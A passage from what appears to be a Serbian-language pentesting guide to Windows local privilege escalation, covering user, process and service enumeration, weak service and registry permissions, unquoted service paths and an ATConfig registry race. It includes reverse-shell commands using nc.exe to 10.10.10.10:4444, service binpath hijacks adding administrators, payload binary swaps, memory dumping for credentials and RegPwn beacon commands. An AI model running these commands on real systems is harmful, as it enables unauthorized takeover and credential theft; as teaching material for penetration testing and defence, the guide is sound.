**Credential Guard** je uveden u **Windows 10**. Njegova svrha je da zaštiti akreditive sačuvane na uređaju od pretnji kao što su napadi pass-the-hash. [**Više informacija o funkciji Credential Guard dostupno je ovde.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Keširani akreditivi

**Akreditive domena** autentifikuje **Local Security Authority** (LSA), a koriste ih komponente operativnog sistema. Kada registrovani bezbednosni paket autentifikuje korisnikove podatke za prijavu, obično se uspostavljaju akreditivi domena za tog korisnika.\
[**Više informacija o keširanim akreditivima ovde**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Korisnici i grupe

### Enumerisanje korisnika i grupa

Treba proveriti da li neka od grupa kojima pripadate ima zanimljive dozvole.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Privilegovane grupe

Ako **pripadate nekoj privilegovanoj grupi, možda možete da eskalirate privilegije**. Ovde saznajte više o privilegovanim grupama i tome kako ih zloupotrebiti za eskalaciju privilegija:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulacija tokenima

**Saznajte više** o tome šta je **token** na ovoj stranici: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Pogledajte sledeću stranicu da biste **saznali više o zanimljivim tokenima** i tome kako ih zloupotrebiti:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Prijavljeni korisnici / Sesije

```bash
qwinsta
klist sessions
```

### Korisničke fascikle

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Politika lozinki

```bash
net accounts
```

### Preuzmite sadržaj međuspremnika

```bash
powershell -command "Get-Clipboard"
```

## Pokrenuti procesi

### Dozvole za fajlove i fascikle

Pre svega, prilikom izlistavanja procesa **proverite da li se u komandnoj liniji procesa nalaze lozinke**.\
Proverite da li možete **da zamenite neku pokrenutu binarnu datoteku** ili imate dozvole za upis u fasciklu sa binarnom datotekom kako biste iskoristili moguće [**DLL Hijacking attacks**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Uvek proverite da li su pokrenuti [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md); mogli biste da ih zloupotrebite za eskalaciju privilegija.

Debugger listener može biti kratkotrajan, pa to što ga nema u jednom pasivnom snimku portova ne dokazuje da nikada nije bio izložen. Povežite svaki uočeni listener sa njegovim PID-om, vlasnikom procesa i mogućnošću korisnika sa nižim privilegijama da mu pristupi; samo ime aplikacije ili debug zastavica ne dokazuju mogućnost izvršavanja koda između korisnika. Rutinsko prikupljanje podataka obavljajte pasivno, umesto da šaljete debugger komande.

**Provera dozvola nad binarnim datotekama procesa**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Provera dozvola nad fasciklama u kojima se nalaze binarne datoteke procesa (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort direktorijumi za dynamic preprocessor

Snort 2 može da učitava shared libraries iz direktorijuma `dynamicpreprocessor directory` navedenog u konfiguraciji izabranoj pomoću `snort.exe -c <config>`. Za scheduled task ili service koji pokreće Snort pod drugim nalogom, pregledajte upravo tu konfiguraciju i ACL deklarisanog direktorijuma modula. Ako vaš token može da kreira fajlove u njemu, tu putanju treba proveriti zbog mogućeg code execution-a pri sledećem učitavanju modula koje obavi taj task ili service. Proverite efektivne privilegije naloga pod kojim se proces pokreće, aktivnu konfiguraciju, kompatibilnost modula i sva ograničenja deny ili share; sama mogućnost upisa u direktorijum ne dokazuje eskalaciju. [Snort-ova dokumentacija za dynamic-preprocessor](https://www.snort.org/documents/dpx-readme) opisuje učitavanje modula tokom izvršavanja.

### Privilegovani web service sa document root-om u koji je moguć upis

Na Windows Apache instalaciji, uporedite putanju izvršne datoteke service-a i nalog pod kojim se pokreće sa vrednošću `DocumentRoot` u njegovom aktivnom `httpd.conf`. Za uobičajenu XAMPP postavku, pregledajte `C:\xampp\apache\conf\httpd.conf` i ACL konfigurisanog document root-a, često `C:\xampp\htdocs`. Ako korisnik sa nižim privilegijama može da kreira fajlove u tom direktorijumu dok Apache radi kao `LocalSystem`, izvršavanje server-side koda može da pređe granicu privilegija hosta. Potvrdite da je service pokrenut, da se poslužuje tačna putanja i da server-side handler obrađuje tip fajla; mogućnost upisa u root sama po sebi dokazuje samo kreiranje fajla. Pregledajte ACL-ove bez upisivanja probnog fajla:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Za konvencionalnu WAMP instalaciju, servis može da pokazuje na verzionisani `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (ili `C:\wamp\...` za 32-bitni raspored), sa konfiguracijom u susednom direktorijumu `conf\httpd.conf` i podrazumevanim korenom `C:\wamp64\www` ili `C:\wamp\www`. Zajedno proverite tačnu servisnu putanju do izvršne datoteke, identitet pod kojim se servis izvršava, efektivni `DocumentRoot` (uključujući proširenje `${INSTALL_DIR}` i izmene u virtuelnim hostovima) i ACL korena. WAMP direktorijum u koji može da se upisuje ne dokazuje da se Apache izvršava kao `SYSTEM` niti da će pokrenuti poslatu datoteku. [Apache dokumentuje kako Windows servis bira konfiguraciju](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### IIS koren u koji može da se upisuje i mrežni identitet pula aplikacija

Za IIS, povežite fizički direktorijum u koji može da se upisuje sa **aktivnim sajtom/aplikacijom** u `applicationHost.config`, a zatim utvrdite koji mu je pul konfigurisan i koji rukovalac obrađuje zahteve na serveru. Kod smešten u direktorijumu koji se poslužuje izvršava se kao pul samo ako IIS obrađuje taj tip datoteke i ako je ruta dostupna. Pre nego što direktorijum u koji može da se upisuje smatrate putem do izvršavanja koda, proverite efektivan pristup trenutnog korisnika za kreiranje datoteka, stanje sajta, rukovalac i izmene konfiguracije za konkretnu putanju.

Dinamička kompilacija ASP.NET-a uvodi zasebnu putanju koju treba proveriti: generisane datoteke u direktorijumu za kompilaciju aplikacije. Podrazumevana lokacija je direktorijum `Temporary ASP.NET Files` ispod relevantne instalacije .NET Framework-a, ali vrednost `<compilation tempDirectory>` u aplikaciji može da je promeni. [Microsoft dokumentuje lokaciju i poddirektorijume za pojedinačne aplikacije](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) i [preporučuje izolaciju direktorijuma za kompilaciju kada pulovi aplikacija ne veruju jedni drugima](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Ako token sa nižim privilegijama može da izmeni generisani izvorni kod u kešu **konkretne** aplikacije, utvrdite da li ga ta aplikacija ponovo kompajlira pod privilegovanijim [identitetom radnog procesa](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). ACL datoteke ili direktorijuma sam po sebi ne dokazuje izvršavanje koda: povežite keš sa aktivnom aplikacijom, efektivnim tokenom i ACL-om, podešavanjima kompilacije, identitetom procesa i vremenom ponovne kompilacije. Pregledajte metapodatke samo za čitanje; tokom enumeracije nemojte pokretati kompilaciju niti menjati datoteke keša.

IIS pul konfigurisan kao `ApplicationPoolIdentity` ili `NetworkService` obično se autentifikuje na domenske resurse kao **nalog računara-domaćina**, iako njegov lokalni token može imati niske privilegije. `LocalSystem` već ima visoke lokalne privilegije i takođe koristi nalog računara na mreži; `LocalService` obično koristi anonimne mrežne akreditive. Pul `SpecificUser` koristi nalog koji je za njega konfigurisan. [Microsoft dokumentuje ove tipove identiteta](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) i [mrežni identitet pula aplikacija](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Ako podešavanje identiteta nije navedeno, mogu da se naslede podrazumevane vrednosti pula, koje se razlikuju između generacija IIS-a, zato utvrdite efektivnu konfiguraciju umesto da zaključujete na osnovu naziva pula. Ako izvršavanje koda dospe do pula koji na mreži koristi identitet naloga računara, procenite prava u direktorijumu za **konkretan računar**. Za [DCSync](../active-directory-methodology/dcsync.md) potrebna su prava replikacije nad kontekstom imenovanja domena; samo mašinski nalog ili uloga hosta ne dokazuju da ta prava postoje. Pasivna enumeracija treba da obuhvati pregled konfiguracije i ACL-ova, bez otpremanja datoteke, uspostavljanja mrežne autentifikacije ili zahtevanja tiketa.

Kod čitljivog ASP.NET rukovaoca koji pokreće pomoćni proces, pratite svaku vrednost izvedenu iz zahteva kroz autentifikaciju, dešifrovanje, validaciju i sastavljanje komande. Rukovalac koji spaja dekodirani token sa `ProcessStartInfo("cmd", "/c ...")` može dozvoliti da metaznakovi shell-a izmene komandu; [Microsoft dokumentuje specijalne znakove u `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Utvrdite da li nepouzdani pozivalac zaista može da utiče na dekodiranu vrednost i dođe do rukovaoca, a zatim utvrdite efektivni identitet pula aplikacija ili identitet tokom impersonacije, kao i identitet pod kojim se izvršava podređeni proces. Čitljiva linija izvornog koda, localhost listener ili slabost u formatu tokena sami po sebi ne dokazuju izvršavanje privilegovanih komandi. Pregledajte izvorni kod i konfiguraciju pula, bez slanja falsifikovanih zahteva ili pokretanja pomoćnog procesa tokom pasivne enumeracije.

Za PHP servis na Windowsu, putanja kojom se upravlja preko zahteva, a prosleđuje se funkciji [`include` ili `require`](https://www.php.net/manual/en/function.include.php), može da izvrši PHP datoteku u koju korisnik sa nižim privilegijama može da upisuje, pod identitetom radnog procesa. Potvrdite da zahtev može da dođe do te naredbe, da razrešena putanja vodi do datoteke koju korisnik sa nižim privilegijama može da menja, a radni proces da čita, da primenjena PHP ograničenja putanja dozvoljavaju uključivanje i da se radni proces zaista izvršava sa višim privilegijama. Loopback listener ili datoteka u koju može da se upisuje sami po sebi ne dokazuju ovaj lanac; pregledajte izvorni kod, identitet servisa i ACL-ove datoteka, bez pozivanja endpointa tokom pasivne enumeracije.

### Pronalaženje lozinki u memoriji

Pomoću **procdump** iz paketa sysinternals možete da napravite dump memorije pokrenutog procesa. Servisi poput FTP-a imaju **akreditive u čistom tekstu u memoriji**; pokušajte da napravite dump memorije i pročitate akreditive.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Nesigurne GUI aplikacije

**Aplikacije koje se pokreću kao SYSTEM mogu omogućiti korisniku da pokrene CMD ili pregleda direktorijume.**

Primer: „Windows Help and Support“ (Windows + F1), pretražite „command prompt“, kliknite na „Click to open Command Prompt“

### Uvoz projektnih datoteka sa privilegijama

Aplikacija koja automatski otvara projekte iz direktorijuma za preuzimanje u koji može da upisuje korisnik sa nižim privilegijama prelazi granicu poverenja u ulazne podatke pod nalogom aplikacije za uvoz. Proverite **tačnu putanju u koju je moguće upisivati**, proces ili zadatak koji je otvara, njegov efektivni identitet i verziju parsera. [Historical Ghidra project open/restore issue](https://github.com/NationalSecurityAgency/ghidra/issues/71) omogućavao je spoljnim XML entitetima da budu navedeni u metapodacima projekta; mrežni entitet u operativnom sistemu Windows mogao bi da izazove autentifikaciju naloga koji vrši uvoz ako je to dozvoljeno [outbound SMB and NTLM policy](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking). To je naznaka mogućeg izlaganja akreditiva, a ne neposrednog administratorskog pristupa: odgovor mora moći da se iskoristi kroz zasebnu autorizovanu ili ranjivu putanju, a aktuelne verzije treba proceniti prema njihovom stvarnom stanju zakrpa. Nemojte otvarati posebno napravljen projekat tokom pasivne enumeracije; pregledajte tok uvoza i ACL-ove.

## Usluge

Pravo [`SC_MANAGER_CREATE_SERVICE` za objekat Service Control Manager (SCM)](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) odvojeno je od prava nad postojećom uslugom. Uspešan zahtev samo za čitanje preko [`OpenSCManager` za pristup](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) sa tim pravom predstavlja povod za proveru, a ne dokaz da nova usluga može da se pokrene. [`CreateService vraća handle`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) sa pravima pristupa usluzi zatraženim prilikom kreiranja; naknadno ponovno otvaranje usluge podrazumeva zasebnu proveru pristupa i može da ne uspe čak i kada bi originalni handle mogao da se iskoristi. Zasebno proverite efektivni lokalni ili udaljeni token, dodeljena prava handle-a, nalog usluge, smernice za pokretanje i putanju izvršne datoteke. Nemojte kreirati ni pokretati uslugu tokom pasivne enumeracije.

Za udaljenu putanju instaliranja usluge, uporedite ta prava SCM-a sa deljenim resursom na ciljnom sistemu u koji **ista mrežna prijava** može da upisuje, njegovim osnovnim NTFS ACL-om i lokalnom putanjom do izvršne datoteke koju nalog usluge može da pokrene. Nalog koji nije administratorski može da pređe ovu granicu ako postoje neuobičajeno široka SCM prava i mogućnost postavljanja datoteke; administrativni deljeni resurs nije neophodan uslov. Samo pravo upisa u deljeni resurs ili samo naznaka prava za kreiranje usluge u SCM-u ne dokazuje da nova usluga može da se pokrene sa višim identitetom.

Postojeća usluga može da pozove pomoćnu izvršnu datoteku pri pokretanju, gašenju ili nekom drugom događaju životnog ciklusa, čak i kada ta pomoćna datoteka nije navedena u njenom `ImagePath`. Ako se ime pomoćne datotеке razrešava do direktorijuma у koji може да уписује корисник са нижим привилегијама, а услуга се покреће са вишим идентитетом, недостајућа помоћна датотека може бити кандидат за условну замену. Потврдите **стварни код услуге или документован позив помоћне датотеке**, разрешену путању извршне датотеке и редослед претраге, права за креирање у директоријуму, идентитет услуге и доступан окидач животног циклуса. Директоријум услуге у који може да се уписује или само недостајућа датотека не доказују да ће услуга учитати ту датотеку; пасивни преглед не треба да покреће нити зауставља услугу.

За постојећу услугу, [`SERVICE_START омогућава прослеђивање аргумената функцији StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); ово право се разликује од [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Прегледајте код услуге или документовани интерфејс пре него што приступ покретању сматрате нечим више од права управљања. Ако услуга користи аргумент који је изабрао позивалац као путању за евиденцију или извоз, проверите идентитет услуге, тачан ток од аргумента до уписа, ограничења путање и дозволе **креиране датотеке**. Упис у заштићени директоријум може довести до ескалације само ако постоји засебан привилеговани процес који ту датотеку користи или учитава; датотека евиденције у коју може да се уписује или право покретања сами по себи нису довољни. Пасивна инвентаризација не треба да покреће услугу нити да креира пробну датотеку.

За NSClient++ monitoring agent, читљив `nsclient.ini` представља **наznaku за преглед конфигурације**: у њему могу бити веб акредитиви, док `boot.ini` може да преусмери конфигурацију на другу локацију. Проверите стварни налог услуге, WEB listener и смернице приступа, као и да ли аутентификована улога може да мења подешавања или скрипте. За привилеговано извршавање потребни су и `CheckExternalScripts` (или друга омогућена путања за извршавање), ефективно право за регистровање или измену команде и окидач који је покреће под идентитетом услуге. Listener ограничен само на loopback и даље може бити доступан локалном кориснику, али сама путања до датотеке, лозинка или listener не доказују постојање тих права. Током пасивне enumeracije прегледајте метаподатке и дозволе без приказивања тајни или позивања web API-ја. Погледајте [NSClient++ file layout](https://nsclient.org/docs/concepts/file-layout/), [web and script security guidance](https://nsclient.org/docs/setup/securing/) и [external-script configuration](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

За услугу чији је `ImagePath` `nssm.exe`, прегледајте стварни налог под којим се услуга покреће и вредност `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM stores the child application there](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), док је `AppDirectory` њен конфигурисани радни директоријум. Проверите ACL-ове подређене извршне датотеке и њеног надређеног директоријума пре него што дозволе wrapper-а сматрате целокупном границом услуге. Локална WCF или SOAP крајња тачка коју излаже та подређена апликација засебна је наznaka за преглед: потврдите да ли је listener доступан кориснику са нижим привилегијама, да ли тачна операција прихвата његов унос и да ли подређени процес услуге извршава небезбедну операцију са вишим идентитетом. Налог услуге, URL крајње тачке или путања у коју може да се уписује сами по себи не доказују ескалацију; избегавајте позивање операција услуге током пасивне enumeracije.

За прилагођену WCF операцију, пратите стринг који контролише позивалац до било ког PowerShell runspace-а. [`Pipeline.Commands.AddScript додаје текст скрипте`](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), а [`Pipeline.Invoke покреће pipeline`](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding са Windows транспортним акредитивима`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) аутентификује клијента, али овлашћење за позивање **те конкретне** операције и ефективни идентитет runspace-а треба проверити засебно. Путања од уноса позиваоца са нижим привилегијама до `AddScript`-а који се извршава под вишим идентитетом услуге представља границу за извршавање кода; порт који ослушкује, аутентификовани клијент или некоришћена метода у неповезаном assembly-ју сами по себи нису доказ. Статички прегледајте примењену услугу, уговор, ауторизацију и подешавања impersonation-а, без позивања крајње тачке током enumeracije.

Service Triggers омогућавају оперативном систему Windows да покрене услугу када се испуне одређени услови (активност именоване цеви/RPC крајње тачке, ETW догађаји, доступност IP-а, прикључење уређаја, освежавање GPO-а итд.). Чак и без права SERVICE_START, често можете да покренете привилеговане услуге активирањем њихових окидача. Технике enumeracije и активације потражите овде:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio diagnostic collector service

Visual Studio инсталације са C/C++ алатима могу да садрже `VSStandardCollectorService150`, дијагностичку услугу конфигурисану да се покреће као `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) је користио junction и трку са object-manager-link-ом да преусмери ресетовање DACL-а услуге. Приказана ескалација је захтевала и употребљиву путању за поправку MSI-ја Visual Studio Setup WMI Provider-а и њен циљ `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Компонента је исправљена у јануару 2024.

За пасивну почетну процену, проверите налог и путању до бинарне датотеке те услуге, да ли постоји путања до Setup WMI compiler-а и статус закрпа инсталиране компоненте. Сам унос услуге, верзија Visual Studio производа или датотека compiler-а не доказују да је систем рањив. Преглед не захтева покретање услуге нити покретање поправке.

Прибавите листу услуга:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Dozvole

Možete koristiti **sc** da biste dobili informacije o servisu.

```bash
sc qc <service_name>
```

Preporučuje se da imate binarnu datoteku **accesschk** iz _Sysinternals_ paketa kako biste proverili potreban nivo privilegija za svaku uslugu.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Preporučuje se da proverite da li grupa „Authenticated Users“ može da menja neki servis:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Ovde možete preuzeti accesschk.exe za XP](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Omogućavanje servisa

Ako dobijate ovu grešku (na primer, sa SSDPSRV):

_Došlo je do sistemske greške 1058._\
_Usluga se ne može pokrenuti jer je onemogućena ili zato što nijedan uređaj povezan sa njom nije omogućen._

Možete je omogućiti pomoću

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Imajte u vidu da servis upnphost zavisi od SSDPSRV-a da bi radio (za XP SP1)**

**Još jedno zaobilazno rešenje** ovog problema je pokretanje:

```
sc.exe config usosvc start= auto
```

### **Izmena putanje binarne datoteke usluge**

U scenariju u kojem grupa „Authenticated users“ ima **SERVICE_ALL_ACCESS** za neku uslugu, moguće je izmeniti izvršnu binarnu datoteku usluge. Da biste izmenili i izvršili **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Ponovno pokretanje usluge

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Privilegije se mogu eskalirati putem različitih dozvola:

- **SERVICE_CHANGE_CONFIG**: Omogućava ponovno konfigurisanje binarne datoteke servisa.
- **WRITE_DAC**: Omogućava ponovno konfigurisanje dozvola, što omogućava menjanje konfiguracije servisa.
- **WRITE_OWNER**: Omogućava preuzimanje vlasništva i ponovno konfigurisanje dozvola.
- **GENERIC_WRITE**: Nasleđuje mogućnost menjanja konfiguracije servisa.
- **GENERIC_ALL**: Takođe nasleđuje mogućnost menjanja konfiguracije servisa.

Za otkrivanje i eksploataciju ove ranjivosti može se koristiti _exploit/windows/local/service_permissions_.

### Slabe dozvole nad binarnim datotekama servisa

Ako se servis izvršava kao **`LocalSystem`**, **`LocalService`**, **`NetworkService`** ili privilegovani domenski nalog, ali **korisnici sa niskim privilegijama mogu da menjaju EXE datoteku servisa ili njenu nadređenu fasciklu**, servis se često može oteti **zamenom binarne datoteke i ponovnim pokretanjem servisa**.

**Proverite da li možete da menjate binarnu datoteku koju izvršava servis** ili da li imate **dozvole za pisanje u fasciklu** u kojoj se binarna datoteka nalazi ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Sve binarne datoteke koje izvršava servis možete da pronađete pomoću **wmic** (ne u system32), a svoje dozvole proverite pomoću **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Možete koristiti i **sc** i **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Potražite opasne ACL-ove dodeljene grupama **`Everyone`**, **`BUILTIN\Users`** ili **`Authenticated Users`**, naročito dozvole **`(F)`**, **`(M)`** ili **`(W)`** za izvršnu datoteku servisa ili direktorijum koji je sadrži. Praktičan tok zloupotrebe je:<sup>[[27]](#references)</sup>

1. Proverite nalog servisa i putanju do izvršne datoteke pomoću komande `sc qc <service_name>`.
2. Proverite da li je binarna datoteka upisiva pomoću komande `icacls <path>`.
3. Zamenite binarnu datoteku servisa payload-om ili ispravnom zlonamernom binarnom datotekom servisa.
4. Ponovo pokrenite servis pomoću komande `sc stop <service_name> && sc start <service_name>` (ili sačekajte ponovno pokretanje sistema / okidač servisa).

Korisne automatizovane provere:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Ako usluga ne dozvoljava običnom korisniku da je ponovo pokrene, proverite da li se automatski pokreće pri pokretanju sistema, da li ima radnju za slučaj otkaza koja je ponovo pokreće ili može li aplikacija koja je koristi indirektno da je pokrene.

### Dozvole za izmenu registra usluga

Trebalo bi da proverite da li možete da izmenite neki registar usluga.\
Možete **proveriti** svoje **dozvole** nad **registrom** usluge ovako:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Proverite da li **Authenticated Users** ili **NT AUTHORITY\INTERACTIVE** imaju dozvole za pisanje u registru na određenom ključu servisa. Sam ACL unos ne dokazuje da je pristup efektivan: važni su unosi za zabranu, trenutni token i nasleđene dozvole. Prava nad ključem registra odvojena su od prava `SERVICE_CHANGE_CONFIG` i `SERVICE_START` nad objektom servisa. Za eskalaciju su takođe potrebni upotrebljivo polje konfiguracije servisa, način da se servis pokrene i identitet servisa sa višim privilegijama. Pogledajte Microsoftove reference za [prava nad ključevima registra](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) i [prava pristupa servisima](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Da biste promenili Path binarne datoteke koja se izvršava:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Trka sa registry symlinkom za upis proizvoljne HKLM vrednosti (ATConfig)

Neke Windows funkcije pristupačnosti kreiraju ključeve **ATConfig** po korisniku, koje proces **SYSTEM** kasnije kopira u HKLM ključ sesije. Trka sa registry **symbolic linkom** može da preusmeri taj privilegovani upis na **bilo koju HKLM putanju**, čime se dobija primitiv za **upis proizvoljne HKLM vrednosti**.<sup>[[18]](#references)</sup>

Lokacije ključeva (primer: tastatura na ekranu `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` navodi instalirane funkcije pristupačnosti.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` čuva konfiguraciju koju kontroliše korisnik.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` kreira se tokom prijavljivanja ili prelaza na bezbednu radnu površinu i korisnik može da ga menja.

Tok zloupotrebe (CVE-2026-24291 / ATConfig):

1. Postavite vrednost **HKCU ATConfig** koju želite da SYSTEM upiše.
2. Pokrenite kopiranje na bezbednoj radnoj površini (npr., **LockWorkstation**), čime se pokreće AT broker tok.
3. **Dobijte race** postavljanjem **oplock** na `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; kada se oplock aktivira, zamenite **HKLM Session ATConfig** ključ registry linkom ka zaštićenom HKLM cilju.
4. SYSTEM upisuje vrednost koju je napadač odabrao na preusmerenu HKLM putanju.

Kada dobijete mogućnost upisa proizvoljne HKLM vrednosti, pređite na LPE tako što ćete prepisati vrednosti konfiguracije servisa:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/komandna linija)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Izaberite servis koji običan korisnik može da pokrene (npr., **`msiserver`**) i pokrenite ga nakon upisa. **Napomena:** javna implementacija exploita **zaključava radnu stanicu** kao deo race uslova.

Primer alata (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Dozvole AppendData/AddSubdirectory u registru servisa

Ako imate ovu dozvolu nad registrom, to znači da **možete da kreirate podregistre unutar njega**. U slučaju Windows servisa, ovo je **dovoljno za izvršavanje proizvoljnog koda:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Putanje do servisa bez navodnika

Ako putanja do izvršne datoteke nije pod navodnicima, Windows će pokušati da izvrši svaku završnu putanju pre razmaka.

Na primer, za putanju _C:\Program Files\Some Folder\Service.exe_ Windows će pokušati da izvrši:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Izlistajte sve putanje servisa koje nisu pod navodnicima, osim onih koje pripadaju ugrađenim Windows servisima:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
